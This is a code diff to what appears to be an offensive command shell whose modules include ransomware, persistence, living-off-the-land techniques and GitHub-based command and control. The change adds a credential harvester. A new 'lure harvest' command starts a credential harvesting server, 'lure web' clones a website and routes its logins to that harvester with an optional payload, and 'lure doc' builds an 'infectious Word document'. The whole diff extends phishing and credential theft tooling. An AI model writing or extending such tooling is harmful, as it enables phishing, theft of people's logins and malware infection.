@@ -39,6 +39,7 @@ from modules import persistence
 import qrcode
 from modules import ransomware
 from modules import lotl
+from modules import harvester
 
 # --- Shell State ---
 github_c2_instance = None
@@ -80,8 +81,9 @@ def print_help():
 def print_lure_help():
     """Prints the help menu for the lure command."""
     print("\n--- Social-Engineering Toolkit ---")
-    print("  lure web <url> <payload_url>   - Clone a website and inject a payload")
-    print("  lure doc <path> <payload_cmd>  - Create an infectious Word document")
+    print("  lure harvest                       - Start the credential harvesting server")
+    print("  lure web <url> [payload_url]       - Clone a website for credential harvesting")
+    print("  lure doc <path> <payload_cmd>      - Create an infectious Word document")
 
 def print_covert_help():
     """Prints the help menu for the covert command."""
@@ -184,12 +186,18 @@ def run_lure_command(args):
     lure_command = args[0]
     lure_args = args[1:]
 
-    if lure_command == "web":
-        if len(lure_args) != 2:
-            print("Usage: lure web <url> <payload_url>")
+    if lure_command == "harvest":
+        harvester.run_harvester_server()
+    elif lure_command == "web":
+        if not 1 <= len(lure_args) <= 2:
+            print("Usage: lure web <url> [payload_url]")
             return
-        url, payload_url = lure_args
-        clone_website(url, payload_url)
+
+        url = lure_args[0]
+        payload_url = lure_args[1] if len(lure_args) == 2 else None
+        harvester_url = "http://0.0.0.0:8000/harvest" # Assuming harvester runs on this
+
+        clone_website(url, harvester_url, payload_url)
     elif lure_command == "doc":
         if len(lure_args) < 2:
             print("Usage: lure doc <output_path> <payload_cmd>")
